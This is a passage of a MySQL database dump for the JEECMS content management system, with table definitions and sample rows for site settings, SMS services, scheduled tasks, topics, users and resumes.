  CONSTRAINT `fk_jc_cfg_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS站点配置表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_site_company
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_company`;
CREATE TABLE `jc_site_company`  (
  `site_id` int(11) NOT NULL,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '公司名称',
  `scale` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '公司规模',
  `nature` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '公司性质',
  `industry` varchar(1000) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '公司行业',
  `contact` varchar(500) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '联系方式',
  `description` text CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '公司简介',
  `address` varchar(500) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '公司地址',
  `longitude` float(5, 2) NULL DEFAULT NULL COMMENT '经度',
  `latitude` float(4, 2) NULL DEFAULT NULL COMMENT '纬度',
  PRIMARY KEY (`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_company_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '公司信息' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_site_company
-- ----------------------------
INSERT INTO `jc_site_company` VALUES (1, 'JEECMS开发站', '10-20人', '私企', '互联网', '', '<p><span id=\"_baidu_bookmark_start_1\" style=\"display: none; line-height: 0px;\">‍</span><span id=\"_baidu_bookmark_start_4\" style=\"display: none; line-height: 0px;\">‍</span></p><p><span id=\"_baidu_bookmark_start_0\" style=\"display: none; line-height: 0px;\">‍</span><span id=\"_baidu_bookmark_start_3\" style=\"display: none; line-height: 0px;\">‍</span><br/></p><p><span id=\"_baidu_bookmark_end_5\" style=\"display: none; line-height: 0px;\">‍</span><span id=\"_baidu_bookmark_end_2\" style=\"display: none; line-height: 0px;\">‍</span></p>', '', NULL, NULL);

-- ----------------------------
-- Table structure for jc_site_model
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_model`;
CREATE TABLE `jc_site_model`  (
  `model_id` int(11) NOT NULL AUTO_INCREMENT,
  `field` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '字段',
  `model_label` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT 10 COMMENT '排列顺序',
  `upload_path` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '上传路径',
  `text_size` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '长度',
  `area_rows` varchar(3) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '文本行数',
  `area_cols` varchar(3) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '文本列数',
  `help` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '帮助信息',
  `help_position` varchar(1) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '帮助位置',
  `data_type` int(11) NULL DEFAULT 1 COMMENT '0:编辑器;1:文本框;2:文本区;3:图片;4:附件',
  `is_single` tinyint(1) NULL DEFAULT 1 COMMENT '是否独占一行',
  PRIMARY KEY (`model_id`) USING BTREE,
  UNIQUE INDEX `ak_field`(`field`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS站点信息模型表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_site_txt
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_txt`;
CREATE TABLE `jc_site_txt`  (
  `site_id` int(11) NOT NULL,
  `txt_name` varchar(30) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `txt_value` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '值',
  INDEX `fk_jc_txt_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_txt_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS站点文本表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_sms
-- ----------------------------
DROP TABLE IF EXISTS `jc_sms`;
CREATE TABLE `jc_sms`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '消息服务名称',
  `access_key_id` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT 'app id/accessKeyId',
  `access_key_secret` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT 'app key/accessKey secret',
  `template_code` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '模板ID',
  `template_param` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '模板对应键',
  `interval_time` int(11) NULL DEFAULT NULL COMMENT '短信发送间隔时间 0无限制',
  `interval_unit` int(1) NULL DEFAULT NULL COMMENT '间隔时间单位 0秒 1分 2时',
  `effective_time` int(11) NULL DEFAULT NULL COMMENT '短信验证码有效时间 0无限制',
  `effective_unit` int(1) NULL DEFAULT NULL COMMENT '有效时间单位 0秒 1分 2时',
  `sign_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '短信签名(阿里)',
  `sms_up_extend_code` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '上行短信扩展码,无特殊需要此字段的用户请忽略此字段(阿里)',
  `out_id` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '外部流水扩展字段',
  `nation_code` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '区域码(腾讯)',
  `end_point` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'SMS服务域名(百度)',
  `invoke_id` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '发送使用签名的调用ID(百度)',
  `sms_source` tinyint(2) NULL DEFAULT NULL COMMENT 'SMS服务平台1阿里 2腾讯 3百度',
  `is_code` tinyint(1) NULL DEFAULT NULL COMMENT '是否为验证码模板',
  `create_time` datetime NULL DEFAULT NULL COMMENT '创建时间',
  `random_num` int(11) NULL DEFAULT NULL COMMENT '验证码位数',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'SMS短信服务配置' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_sms_record
-- ----------------------------
DROP TABLE IF EXISTS `jc_sms_record`;
CREATE TABLE `jc_sms_record`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `phone` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '电话号码',
  `send_time` datetime NULL DEFAULT NULL COMMENT '发送时间',
  `send_content` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '发送内容',
  `sms_id` int(11) NULL DEFAULT NULL COMMENT '短信服务id',
  `site_id` int(11) NULL DEFAULT NULL,
  `user_id` int(11) NULL DEFAULT 1,
  `validate_type` int(2) NULL DEFAULT 0 COMMENT '验证类型  0：未知 1 : 注册验证 2 : 找回密码验证 ',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'SMS短信服务记录' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_task
-- ----------------------------
DROP TABLE IF EXISTS `jc_task`;
CREATE TABLE `jc_task`  (
  `task_id` int(11) NOT NULL AUTO_INCREMENT,
  `task_code` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '任务执行代码',
  `task_type` tinyint(1) NOT NULL DEFAULT 0 COMMENT '任务类型(1首页静态化、2栏目页静态化、3内容页静态化、4采集、5分发)',
  `task_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '任务名称',
  `job_class` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '任务类',
  `execycle` tinyint(1) NOT NULL DEFAULT 1 COMMENT '执行周期分类(1非表达式 2 cron表达式)',
  `day_of_month` int(11) NULL DEFAULT NULL COMMENT '每月的哪天',
  `day_of_week` tinyint(1) NULL DEFAULT NULL COMMENT '周几',
  `hour` int(11) NULL DEFAULT NULL COMMENT '小时',
  `minute` int(11) NULL DEFAULT NULL COMMENT '分钟',
  `interval_hour` int(11) NULL DEFAULT NULL COMMENT '间隔小时',
  `interval_minute` int(11) NULL DEFAULT NULL COMMENT '间隔分钟',
  `task_interval_unit` tinyint(1) NULL DEFAULT NULL COMMENT '1分钟、2小时、3日、4周、5月',
  `cron_expression` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '规则表达式',
  `is_enable` tinyint(1) NOT NULL DEFAULT 1 COMMENT '是否启用',
  `task_remark` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '任务说明',
  `site_id` int(11) NOT NULL COMMENT '站点',
  `user_id` int(11) NOT NULL COMMENT '创建者',
  `create_time` datetime NOT NULL COMMENT '创建时间',
  PRIMARY KEY (`task_id`) USING BTREE,
  INDEX `fk_jc_task_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_task_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '任务表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_task
-- ----------------------------
INSERT INTO `jc_task` VALUES (3, '1e4003b7-4024-403a-be12-72cb39cb8225', 1, '11', 'com.jeecms.cms.task.job.IndexStaticJob', 1, NULL, NULL, NULL, NULL, NULL, 1, 1, NULL, 0, '', 1, 1, '2016-06-25 10:40:07');

-- ----------------------------
-- Table structure for jc_task_attr
-- ----------------------------
DROP TABLE IF EXISTS `jc_task_attr`;
CREATE TABLE `jc_task_attr`  (
  `task_id` int(11) NOT NULL,
  `param_name` varchar(30) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '参数名称',
  `param_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '参数值',
  INDEX `fk_jc_attr_task`(`task_id`) USING BTREE,
  CONSTRAINT `fk_jc_attr_task` FOREIGN KEY (`task_id`) REFERENCES `jc_task` (`task_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '任务参数表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_task_attr
-- ----------------------------
INSERT INTO `jc_task_attr` VALUES (3, 'site_id', '1');
INSERT INTO `jc_task_attr` VALUES (3, 'acqu_id', '');
INSERT INTO `jc_task_attr` VALUES (3, 'channel_id', '');
INSERT INTO `jc_task_attr` VALUES (3, 'ftp_id', '');

-- ----------------------------
-- Table structure for jc_third_account
-- ----------------------------
DROP TABLE IF EXISTS `jc_third_account`;
CREATE TABLE `jc_third_account`  (
  `account_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `account_key` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '第三方账号key',
  `username` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '0' COMMENT '关联用户名',
  `source` varchar(10) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '第三方账号平台(QQ、新浪微博等)',
  `user_id` int(11) NULL DEFAULT NULL COMMENT '用户iD',
  PRIMARY KEY (`account_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '第三方登录平台账号' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_topic
-- ----------------------------
DROP TABLE IF EXISTS `jc_topic`;
CREATE TABLE `jc_topic`  (
  `topic_id` int(11) NOT NULL AUTO_INCREMENT,
  `channel_id` int(11) NULL DEFAULT NULL,
  `topic_name` varchar(150) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `short_name` varchar(150) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '简称',
  `keywords` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '关键字',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '描述',
  `title_img` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '标题图',
  `content_img` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容图',
  `tpl_content` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '专题模板',
  `priority` int(11) NOT NULL DEFAULT 10 COMMENT '排列顺序',
  `is_recommend` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否推??',
  `initials` varchar(150) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '首字母拼音简写',
  PRIMARY KEY (`topic_id`) USING BTREE,
  INDEX `fk_jc_topic_channel`(`channel_id`) USING BTREE,
  CONSTRAINT `fk_jc_topic_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 7 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS专题表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_topic
-- ----------------------------
INSERT INTO `jc_topic` VALUES (4, NULL, '招聘、面试专题发布', '面试、招聘', '面试', '这是一个关于面试、招聘的的专题', '/menhu/u/cms/www/201901/28095748y4du.jpg', NULL, '', 10, 1, 'zpmsztfb');
INSERT INTO `jc_topic` VALUES (5, NULL, '视频类专题', '视频专题', '视频', '视频专题', '/menhu/u/cms/www/201901/28100204sug3.jpg', NULL, '', 10, 1, 'splzt');
INSERT INTO `jc_topic` VALUES (6, NULL, '通用专题', '通用', '通用', '用用专题专题', '/menhu/u/cms/www/201901/28163055zm48.jpg', '/menhu/u/cms/www/201901/28163058i8qa.jpg', '', 1, 1, 'tyzt');

-- ----------------------------
-- Table structure for jc_topic_channel
-- ----------------------------
DROP TABLE IF EXISTS `jc_topic_channel`;
CREATE TABLE `jc_topic_channel`  (
  `topic_id` int(11) NOT NULL,
  `channel_id` int(11) NOT NULL,
  PRIMARY KEY (`topic_id`, `channel_id`) USING BTREE,
  INDEX `fk_jc_topic_channel_channel`(`channel_id`) USING BTREE,
  INDEX `fk_jc_topic_channel_topic`(`topic_id`) USING BTREE,
  CONSTRAINT `fk_jc_topic_channel_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_topic_channel_topic` FOREIGN KEY (`topic_id`) REFERENCES `jc_topic` (`topic_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_topic_channel
-- ----------------------------
INSERT INTO `jc_topic_channel` VALUES (6, 75);
INSERT INTO `jc_topic_channel` VALUES (6, 76);
INSERT INTO `jc_topic_channel` VALUES (5, 77);
INSERT INTO `jc_topic_channel` VALUES (6, 77);
INSERT INTO `jc_topic_channel` VALUES (6, 78);
INSERT INTO `jc_topic_channel` VALUES (4, 79);
INSERT INTO `jc_topic_channel` VALUES (6, 79);
INSERT INTO `jc_topic_channel` VALUES (6, 90);
INSERT INTO `jc_topic_channel` VALUES (6, 91);
INSERT INTO `jc_topic_channel` VALUES (6, 92);
INSERT INTO `jc_topic_channel` VALUES (6, 93);
INSERT INTO `jc_topic_channel` VALUES (4, 94);
INSERT INTO `jc_topic_channel` VALUES (6, 94);

-- ----------------------------
-- Table structure for jc_user
-- ----------------------------
DROP TABLE IF EXISTS `jc_user`;
CREATE TABLE `jc_user`  (
  `user_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  `username` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '用户名',
  `email` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '邮箱',
  `register_time` datetime NOT NULL COMMENT '注册时间',
  `register_ip` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '127.0.0.1' COMMENT '注册IP',
  `last_login_time` datetime NOT NULL COMMENT '最后登录时间',
  `last_login_ip` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '127.0.0.1' COMMENT '最后登录IP',
  `login_count` int(11) NOT NULL DEFAULT 0 COMMENT '登录次数',
  `rank` int(11) NOT NULL DEFAULT 0 COMMENT '管理员级别',
  `upload_total` bigint(20) NOT NULL DEFAULT 0 COMMENT '上传总大小',
  `upload_size` int(11) NOT NULL DEFAULT 0 COMMENT '上传大小',
  `upload_date` date NULL DEFAULT NULL COMMENT '上传日期',
  `is_admin` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否管理员',
  `is_self_admin` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否只管理自己的数据',
  `statu` tinyint(1) NOT NULL DEFAULT 0 COMMENT '状态 0审核通过  1禁用  2待审核',
  `session_id` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `is_viewonly_admin` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否只读管理员',
  PRIMARY KEY (`user_id`) USING BTREE,
  UNIQUE INDEX `ak_username`(`username`) USING BTREE,
  INDEX `fk_jc_user_group`(`group_id`) USING BTREE,
  CONSTRAINT `fk_jc_user_group` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS用户表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_user
-- ----------------------------
INSERT INTO `jc_user` VALUES (1, 1, 'admin', 'aa@qq.com', '2011-01-03 00:00:00', '127.0.0.1', '2019-01-29 10:16:34', '127.0.0.1', 2838, 9, 342809, 5051, '2019-01-28', 1, 0, 0, 'E41796EB43E20D9F79C7E7ACA6F73EBB', 0);
INSERT INTO `jc_user` VALUES (2, 1, 'xlb123', '913971360@qq.com', '2018-11-22 14:41:05', '127.0.0.1', '2018-11-22 14:41:15', '127.0.0.1', 1, 0, 0, 0, '2018-11-22', 0, 0, 0, '656D20D95E64C8F570044BC4D845C3A2', 0);

-- ----------------------------
-- Table structure for jc_user_account
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_account`;
CREATE TABLE `jc_user_account`  (
  `user_id` int(11) NOT NULL,
  `account_weixin` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '微信账号名',
  `account_weixin_openId` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '微信账号openid',
  `account_alipy` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '支付宝账号',
  `draw_account` tinyint(1) NOT NULL DEFAULT 0 COMMENT '提现账户(0微信 1支付宝)',
  `content_total_amount` double(15, 4) NULL DEFAULT 0.0000 COMMENT '稿费总金额',
  `content_no_pay_amount` double(15, 4) NULL DEFAULT 0.0000 COMMENT '待提现稿费金额',
  `content_year_amount` double(15, 4) NOT NULL DEFAULT 0.0000 COMMENT '稿费年金额',
  `content_month_amount` double(15, 4) NOT NULL DEFAULT 0.0000 COMMENT '稿费本月金额',
  `content_day_amount` double(15, 4) NOT NULL DEFAULT 0.0000 COMMENT '稿费本日金额',
  `content_buy_count` int(11) NULL DEFAULT NULL COMMENT '被用户购买次数',
  `draw_count` int(11) NULL DEFAULT 0 COMMENT '累计提现次数',
  `last_draw_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '上次提现时间',
  `last_buy_time` timestamp NULL DEFAULT NULL COMMENT '上次用户购买时间',
  PRIMARY KEY (`user_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户稿费收费配置' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_user_attr
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_attr`;
CREATE TABLE `jc_user_attr`  (
  `user_id` int(11) NOT NULL,
  `attr_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `attr_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  INDEX `fk_jc_attr_user`(`user_id`) USING BTREE,
  CONSTRAINT `fk_jc_attr_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户属性表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_user_collection
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_collection`;
CREATE TABLE `jc_user_collection`  (
  `user_id` int(11) NOT NULL DEFAULT 0 COMMENT '用户id',
  `content_id` int(11) NOT NULL DEFAULT 0 COMMENT '内容id',
  PRIMARY KEY (`user_id`, `content_id`) USING BTREE,
  INDEX `fk_jc_user_collection_con`(`content_id`) USING BTREE,
  CONSTRAINT `fk_jc_user_collection_con` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_user_collection_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户收藏关联表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_user_ext
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_ext`;
CREATE TABLE `jc_user_ext`  (
  `user_id` int(11) NOT NULL,
  `realname` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '真实姓名',
  `gender` tinyint(1) NULL DEFAULT NULL COMMENT '性别',
  `birthday` datetime NULL DEFAULT NULL COMMENT '出生日期',
  `intro` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '个人介绍',
  `comefrom` varchar(150) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '来自',
  `qq` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'QQ',
  `msn` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'MSN',
  `phone` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '电话',
  `mobile` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '手机',
  `user_img` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '用户头像',
  `user_signature` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '用户个性签名',
  `today_guestbook_total` int(11) NOT NULL DEFAULT 0 COMMENT '今日留言数',
  `today_comment_total` int(11) NOT NULL DEFAULT 0 COMMENT '今日评论数',
  PRIMARY KEY (`user_id`) USING BTREE,
  CONSTRAINT `fk_jc_ext_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS用户扩展信息表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_user_ext
-- ----------------------------
INSERT INTO `jc_user_ext` VALUES (1, 'JEECMS', 1, '2015-04-09 00:00:00', NULL, '南昌', NULL, NULL, '1110999', '121212', '/menhu/user/images/201812/11111131jc0q.jpeg', '', 0, 3);
INSERT INTO `jc_user_ext` VALUES (2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0);

-- ----------------------------
-- Table structure for jc_user_menu
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_menu`;
CREATE TABLE `jc_user_menu`  (
  `menu_id` int(11) NOT NULL AUTO_INCREMENT,
  `menu_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '菜单名称',
  `menu_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '菜单地址',
  `priority` int(11) NOT NULL DEFAULT 10,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`menu_id`) USING BTREE,
  INDEX `fk_jc_menu_user`(`user_id`) USING BTREE,
  CONSTRAINT `fk_jc_menu_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户常用菜单' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_user_resume
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_resume`;
CREATE TABLE `jc_user_resume`  (
  `user_id` int(11) NOT NULL,
  `resume_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '简历名称',
  `target_worknature` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '期望工作性质',
  `target_workplace` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '期望工作地点',
  `target_category` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '期望职位类别',
  `target_salary` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '期望月薪',
  `edu_school` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '毕业学校',
  `edu_graduation` datetime NULL DEFAULT NULL COMMENT '毕业时间',
  `edu_back` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '学历',
  `edu_discipline` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '专业',
  `recent_company` varchar(500) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '最近工作公司名称',
  `company_industry` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '最近公司所属行业',
  `company_scale` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '公司规模',
  `job_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '职位名称',
  `job_category` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '职位类别',
  `job_start` datetime NULL DEFAULT NULL COMMENT '工作起始时间',
  `subordinates` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '下属人数',
  `job_description` text CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '工作描述',
  `self_evaluation` varchar(2000) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '自我评价',
  PRIMARY KEY (`user_id`) USING BTREE,
  CONSTRAINT `fk_jc_resume_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户简历' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_user_resume
-- ----------------------------
